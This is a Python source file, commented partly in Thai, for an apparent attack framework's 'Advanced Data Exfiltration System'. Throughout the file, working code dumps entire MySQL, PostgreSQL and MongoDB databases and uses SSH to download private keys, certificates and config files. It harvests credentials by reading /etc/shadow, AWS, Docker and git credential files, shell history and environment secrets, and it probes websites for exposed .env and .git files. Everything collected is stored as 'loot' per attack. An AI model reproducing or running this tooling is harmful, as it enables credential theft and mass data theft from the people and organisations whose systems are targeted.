"""
Advanced Data Exfiltration System
ดึงข้อมูลสำคัญจากเป้าหมายและบันทึกอย่างครบถ้วน
"""

import asyncio
import aiohttp
import aiofiles
import os
import json
import hashlib
from typing import Dict, List, Any, Optional
from datetime import datetime
from pathlib import Path
import paramiko
from core.logger import log
from core.error_handlers import handle_exfiltration_errors, handle_errors


class DataExfiltrator:
    """
    ระบบ Exfiltrate ข้อมูลแบบครบวงจร
    
    Features:
    - Database Dumper (MySQL, PostgreSQL, MSSQL, MongoDB, etc.)
    - File System Scanner & Downloader
    - Credential Harvester
    - Configuration File Collector
    - Source Code Downloader
    - Memory Dumper
    - Browser Data Extractor
    """
    
    def __init__(self, attack_id: str, user_key: str):
        self.attack_id = attack_id
        self.user_key = user_key
        workspace_dir = os.getenv('WORKSPACE_DIR', 'workspace')
        self.base_dir = os.path.join(workspace_dir, 'loot', 'exfiltrated', attack_id)
        self.manifest = {
            "attack_id": attack_id,
            "user_key": user_key,
            "started_at": datetime.now().isoformat(),
            "files": [],
            "databases": [],
            "credentials": [],
            "total_size": 0
        }
        os.makedirs(self.base_dir, exist_ok=True)
        
    @handle_exfiltration_errors
    async def exfiltrate_all(self, context: Dict[str, Any]) -> Dict:
        """Exfiltrate ทุกอย่างที่เป็นไปได้"""
        log.info(f"[Exfiltrator] Starting full data exfiltration for attack {self.attack_id}")
        
        results = {
            "success": False,
            "attack_id": self.attack_id,
            "tasks": {}
        }
        
        # Task 1: Database Dump
        if context.get("database_access"):
            db_result = await self.dump_databases(context["database_access"])
            results["tasks"]["database_dump"] = db_result
        
        # Task 2: File System Scan
        if context.get("shell_access"):
            fs_result = await self.scan_and_download_files(context["shell_access"])
            results["tasks"]["file_system"] = fs_result
        
        # Task 3: Credential Harvesting
        if context.get("shell_access"):
            cred_result = await self.harvest_credentials(context["shell_access"])
            results["tasks"]["credentials"] = cred_result
        
        # Task 4: Configuration Files
        if context.get("web_access"):
            config_result = await self.collect_config_files(context["web_access"])
            results["tasks"]["config_files"] = config_result
        
        # Task 5: Source Code
        if context.get("web_access"):
            source_result = await self.download_source_code(context["web_access"])
            results["tasks"]["source_code"] = source_result
        
        # Save manifest
        self.manifest["completed_at"] = datetime.now().isoformat()
        await self._save_manifest()
        
        results["success"] = any(task.get("success") for task in results["tasks"].values())
        results["manifest_file"] = f"{self.base_dir}/manifest.json"
        results["total_files"] = len(self.manifest["files"])
        results["total_size"] = self.manifest["total_size"]
        
        log.success(f"[Exfiltrator] Exfiltration complete: {results['total_files']} files, {self._format_size(results['total_size'])}")
        
        return results

    @handle_exfiltration_errors
    async def dump_databases(self, db_access: Dict) -> Dict:
        """Dump ฐานข้อมูลทั้งหมด"""
        log.info("[Exfiltrator] Dumping databases...")
        
        db_type = db_access.get("type", "mysql")
        host = db_access.get("host", "localhost")
        port = db_access.get("port", 3306)
        username = db_access.get("username")
        password = db_access.get("password")
        
        dumped_dbs = []
        
        try:
            if db_type == "mysql":
                result = await self._dump_mysql(host, port, username, password)
            elif db_type == "postgresql":
                result = await self._dump_postgresql(host, port, username, password)
            elif db_type == "mssql":
                result = await self._dump_mssql(host, port, username, password)
            elif db_type == "mongodb":
                result = await self._dump_mongodb(host, port, username, password)
            else:
                return {"success": False, "error": f"Unsupported database type: {db_type}"}
            
            return result
            
        except Exception as e:
            log.error(f"[Exfiltrator] Database dump failed: {e}")
            return {"success": False, "error": str(e)}

    @handle_exfiltration_errors
    async def _dump_mysql(self, host: str, port: int, username: str, password: str) -> Dict:
        """Dump MySQL database"""
        try:
            import pymysql
            
            connection = pymysql.connect(
                host=host,
                port=port,
                user=username,
                password=password
            )
            
            cursor = connection.cursor()
            
            # Get all databases
            cursor.execute("SHOW DATABASES")
            databases = [db[0] for db in cursor.fetchall()]
            
            dumped = []
            
            for db_name in databases:
                if db_name in ["information_schema", "performance_schema", "mysql", "sys"]:
                    continue
                
                log.info(f"[Exfiltrator] Dumping database: {db_name}")
                
                cursor.execute(f"USE {db_name}")
                cursor.execute("SHOW TABLES")
                tables = [table[0] for table in cursor.fetchall()]
                
                db_dump = {
                    "database": db_name,
                    "tables": {}
                }
                
                for table in tables:
                    cursor.execute(f"SELECT * FROM {table}")
                    rows = cursor.fetchall()
                    
                    cursor.execute(f"DESCRIBE {table}")
                    columns = [col[0] for col in cursor.fetchall()]
                    
                    db_dump["tables"][table] = {
                        "columns": columns,
                        "rows": [dict(zip(columns, row)) for row in rows]
                    }
                
                # Save to file
                dump_file = f"{self.base_dir}/mysql_{db_name}.json"
                async with aiofiles.open(dump_file, 'w') as f:
                    await f.write(json.dumps(db_dump, indent=2, default=str))
                
                file_size = os.path.getsize(dump_file)
                self.manifest["databases"].append({
                    "type": "mysql",
                    "name": db_name,
                    "file": dump_file,
                    "size": file_size,
                    "tables": len(tables)
                })
                self.manifest["total_size"] += file_size
                
                dumped.append(db_name)
                log.success(f"[Exfiltrator] Dumped {db_name}: {len(tables)} tables")
            
            connection.close()
            
            return {
                "success": True,
                "type": "mysql",
                "databases": dumped,
                "total": len(dumped)
            }
            
        except Exception as e:
            log.error(f"[Exfiltrator] MySQL dump failed: {e}")
            return {"success": False, "error": str(e)}

    @handle_exfiltration_errors
    async def _dump_postgresql(self, host: str, port: int, username: str, password: str) -> Dict:
        """Dump PostgreSQL database"""
        try:
            import psycopg2
            
            connection = psycopg2.connect(
                host=host,
                port=port,
                user=username,
                password=password,
                database="postgres"
            )
            
            cursor = connection.cursor()
            
            # Get all databases
            cursor.execute("SELECT datname FROM pg_database WHERE datistemplate = false")
            databases = [db[0] for db in cursor.fetchall()]
            
            dumped = []
            
            for db_name in databases:
                if db_name in ["postgres"]:
                    continue
                
                log.info(f"[Exfiltrator] Dumping database: {db_name}")
                
                # Connect to specific database
                db_conn = psycopg2.connect(
                    host=host,
                    port=port,
                    user=username,
                    password=password,
                    database=db_name
                )
                db_cursor = db_conn.cursor()
                
                # Get all tables
                db_cursor.execute("""
                    SELECT table_name 
                    FROM information_schema.tables 
                    WHERE table_schema = 'public'
                """)
                tables = [table[0] for table in db_cursor.fetchall()]
                
                db_dump = {
                    "database": db_name,
                    "tables": {}
                }
                
                for table in tables:
                    db_cursor.execute(f"SELECT * FROM {table}")
                    rows = db_cursor.fetchall()
                    
                    db_cursor.execute(f"""
                        SELECT column_name 
                        FROM information_schema.columns 
                        WHERE table_name = '{table}'
                    """)
                    columns = [col[0] for col in db_cursor.fetchall()]
                    
                    db_dump["tables"][table] = {
                        "columns": columns,
                        "rows": [dict(zip(columns, row)) for row in rows]
                    }
                
                # Save to file
                dump_file = f"{self.base_dir}/postgresql_{db_name}.json"
                async with aiofiles.open(dump_file, 'w') as f:
                    await f.write(json.dumps(db_dump, indent=2, default=str))
                
                file_size = os.path.getsize(dump_file)
                self.manifest["databases"].append({
                    "type": "postgresql",
                    "name": db_name,
                    "file": dump_file,
                    "size": file_size,
                    "tables": len(tables)
                })
                self.manifest["total_size"] += file_size
                
                dumped.append(db_name)
                db_conn.close()
                log.success(f"[Exfiltrator] Dumped {db_name}: {len(tables)} tables")
            
            connection.close()
            
            return {
                "success": True,
                "type": "postgresql",
                "databases": dumped,
                "total": len(dumped)
            }
            
        except Exception as e:
            log.error(f"[Exfiltrator] PostgreSQL dump failed: {e}")
            return {"success": False, "error": str(e)}

    @handle_exfiltration_errors
    async def _dump_mongodb(self, host: str, port: int, username: str, password: str) -> Dict:
        """Dump MongoDB database"""
        try:
            from pymongo import MongoClient
            
            client = MongoClient(
                host=host,
                port=port,
                username=username,
                password=password
            )
            
            databases = client.list_database_names()
            dumped = []
            
            for db_name in databases:
                if db_name in ["admin", "local", "config"]:
                    continue
                
                log.info(f"[Exfiltrator] Dumping database: {db_name}")
                
                db = client[db_name]
                collections = db.list_collection_names()
                
                db_dump = {
                    "database": db_name,
                    "collections": {}
                }
                
                for collection_name in collections:
                    collection = db[collection_name]
                    documents = list(collection.find())
                    
                    db_dump["collections"][collection_name] = {
                        "count": len(documents),
                        "documents": documents
                    }
                
                # Save to file
                dump_file = f"{self.base_dir}/mongodb_{db_name}.json"
                async with aiofiles.open(dump_file, 'w') as f:
                    await f.write(json.dumps(db_dump, indent=2, default=str))
                
                file_size = os.path.getsize(dump_file)
                self.manifest["databases"].append({
                    "type": "mongodb",
                    "name": db_name,
                    "file": dump_file,
                    "size": file_size,
                    "collections": len(collections)
                })
                self.manifest["total_size"] += file_size
                
                dumped.append(db_name)
                log.success(f"[Exfiltrator] Dumped {db_name}: {len(collections)} collections")
            
            client.close()
            
            return {
                "success": True,
                "type": "mongodb",
                "databases": dumped,
                "total": len(dumped)
            }
            
        except Exception as e:
            log.error(f"[Exfiltrator] MongoDB dump failed: {e}")
            return {"success": False, "error": str(e)}

    async def scan_and_download_files(self, shell_access: Dict) -> Dict:
        """สแกนและดาวน์โหลดไฟล์สำคัญ"""
        log.info("[Exfiltrator] Scanning file system...")
        
        # Target files
        target_patterns = [
            "*.conf",
            "*.config",
            "*.env",
            "*.ini",
            "*.xml",
            "*.json",
            "*.yaml",
            "*.yml",
            "*.key",
            "*.pem",
            "*.crt",
            "*.p12",
            "*.pfx",
            "*password*",
            "*secret*",
            "*credential*",
            "id_rsa",
            "id_dsa",
            ".ssh/*",
            ".aws/*",
            ".docker/*",
            "*.sql",
            "*.db",
            "*.sqlite",
            "*.log"
        ]
        
        # Target directories
        target_dirs = [
            "/etc/",
            "/var/www/",
            os.path.expanduser("~"),
            "/root/",
            "/opt/",
            "/usr/local/",
            "/var/log/"
        ]
        
        downloaded_files = []
        
        try:
            # Use SSH to scan and download
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            ssh.connect(
                hostname=shell_access.get("host"),
                port=shell_access.get("port", 22),
                username=shell_access.get("username"),
                password=shell_access.get("password"),
                key_filename=shell_access.get("key_file")
            )
            
            sftp = ssh.open_sftp()
            
            for directory in target_dirs:
                for pattern in target_patterns:
                    # Find files
                    stdin, stdout, stderr = ssh.exec_command(f"find {directory} -name '{pattern}' -type f 2>/dev/null")
                    files = stdout.read().decode().strip().split('\n')
                    
                    for remote_file in files:
                        if not remote_file:
                            continue
                        
                        try:
                            # Download file
                            local_file = f"{self.base_dir}/files{remote_file}"
                            os.makedirs(os.path.dirname(local_file), exist_ok=True)
                            
                            sftp.get(remote_file, local_file)
                            
                            file_size = os.path.getsize(local_file)
                            file_hash = self._calculate_hash(local_file)
                            
                            self.manifest["files"].append({
                                "remote_path": remote_file,
                                "local_path": local_file,
                                "size": file_size,
                                "hash": file_hash,
                                "downloaded_at": datetime.now().isoformat()
                            })
                            self.manifest["total_size"] += file_size
                            
                            downloaded_files.append(remote_file)
                            log.success(f"[Exfiltrator] Downloaded: {remote_file}")
                            
                        except Exception as e:
                            log.debug(f"[Exfiltrator] Failed to download {remote_file}: {e}")
            
            sftp.close()
            ssh.close()
            
            return {
                "success": True,
                "files": downloaded_files,
                "total": len(downloaded_files)
            }
            
        except Exception as e:
            log.error(f"[Exfiltrator] File scan failed: {e}")
            return {"success": False, "error": str(e)}

    async def harvest_credentials(self, shell_access: Dict) -> Dict:
        """เก็บ credentials จากระบบ"""
        log.info("[Exfiltrator] Harvesting credentials...")
        
        credentials = []
        
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            ssh.connect(
                hostname=shell_access.get("host"),
                port=shell_access.get("port", 22),
                username=shell_access.get("username"),
                password=shell_access.get("password"),
                key_filename=shell_access.get("key_file")
            )
            
            # Commands to extract credentials
            commands = [
                ("passwd", "cat /etc/passwd"),
                ("shadow", "cat /etc/shadow"),
                ("ssh_keys", "find /home -name 'id_rsa' -o -name 'id_dsa' 2>/dev/null"),
                ("aws_creds", "cat ~/.aws/credentials"),
                ("docker_config", "cat ~/.docker/config.json"),
                ("git_credentials", "cat ~/.git-credentials"),
                ("bash_history", "cat ~/.bash_history | grep -i 'password\\|secret\\|key'"),
                ("env_vars", "env | grep -i 'password\\|secret\\|key\\|token'"),
            ]
            
            for name, command in commands:
                stdin, stdout, stderr = ssh.exec_command(command)
                output = stdout.read().decode()
                
                if output:
                    cred_file = f"{self.base_dir}/credentials_{name}.txt"
                    async with aiofiles.open(cred_file, 'w') as f:
                        await f.write(output)
                    
                    credentials.append({
                        "type": name,
                        "file": cred_file,
                        "size": len(output)
                    })
                    
                    log.success(f"[Exfiltrator] Harvested: {name}")
            
            ssh.close()
            
            self.manifest["credentials"] = credentials
            
            return {
                "success": True,
                "credentials": credentials,
                "total": len(credentials)
            }
            
        except Exception as e:
            log.error(f"[Exfiltrator] Credential harvesting failed: {e}")
            return {"success": False, "error": str(e)}

    async def collect_config_files(self, web_access: Dict) -> Dict:
        """เก็บไฟล์ config จาก web application"""
        log.info("[Exfiltrator] Collecting configuration files...")
        
        base_url = web_access.get("url")
        
        # Common config file paths
        config_paths = [
            ".env",
            ".env.local",
            ".env.production",
            "config.php",
            "config.json",
            "config.yaml",
            "settings.py",
            "web.config",
            "application.properties",
            "database.yml",
            ".git/config",
            ".htaccess",
            "composer.json",
            "package.json",
            "Dockerfile",
            "docker-compose.yml",
        ]
        
        collected = []
        
        try:
            async with aiohttp.ClientSession() as session:
                for config_path in config_paths:
                    url = f"{base_url.rstrip('/')}/{config_path}"
                    
                    try:
                        async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                            if response.status == 200:
                                content = await response.text()
                                
                                # Save file
                                local_file = f"{self.base_dir}/web_configs/{config_path}"
                                os.makedirs(os.path.dirname(local_file), exist_ok=True)
                                
                                async with aiofiles.open(local_file, 'w') as f:
                                    await f.write(content)
                                
                                collected.append({
                                    "url": url,
                                    "file": local_file,
                                    "size": len(content)
                                })
                                
                                log.success(f"[Exfiltrator] Collected: {config_path}")
                    
                    except Exception as e:
                        log.debug(f"[Exfiltrator] Failed to collect {config_path}: {e}")
                        pass
            
            return {
                "success": len(collected) > 0,
                "files": collected,
                "total": len(collected)
            }
            
        except Exception as e:
            log.error(f"[Exfiltrator] Config collection failed: {e}")
            return {"success": False, "error": str(e)}

    async def download_source_code(self, web_access: Dict) -> Dict:
        """ดาวน์โหลด source code ถ้าเป็นไปได้"""
        log.info("[Exfiltrator] Attempting to download source code...")
        
        base_url = web_access.get("url")
        
        # Try to download via .git
        git_url = f"{base_url.rstrip('/')}/.git/"
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(git_url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                    if response.status == 200:
                        # Git directory is exposed!
                        log.success("[Exfiltrator] Git directory exposed! Downloading...")
                        
                        # Use git-dumper or similar tool
                        # For now, just note it
                        return {
                            "success": True,
                            "method": "git",
                            "url": git_url,
                            "message": "Git directory exposed - manual download recommended"
                        }
            
            return {
                "success": False,
                "message": "Source code not accessible"
            }
            
        except Exception as e:
            log.error(f"[Exfiltrator] Source code download failed: {e}")
            return {"success": False, "error": str(e)}

    async def _save_manifest(self):
        """บันทึก manifest file"""
        manifest_file = f"{self.base_dir}/manifest.json"
        async with aiofiles.open(manifest_file, 'w') as f:
            await f.write(json.dumps(self.manifest, indent=2))
        log.info(f"[Exfiltrator] Manifest saved: {manifest_file}")

    def _calculate_hash(self, file_path: str) -> str:
        """คำนวณ SHA256 hash ของไฟล์"""
        sha256 = hashlib.sha256()
        with open(file_path, 'rb') as f:
            for chunk in iter(lambda: f.read(4096), b""):
                sha256.update(chunk)
        return sha256.hexdigest()

    def _format_size(self, size: int) -> str:
        """แปลง size เป็น human-readable format"""
        for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
            if size < 1024.0:
                return f"{size:.2f} {unit}"
            size /= 1024.0
        return f"{size:.2f} PB"

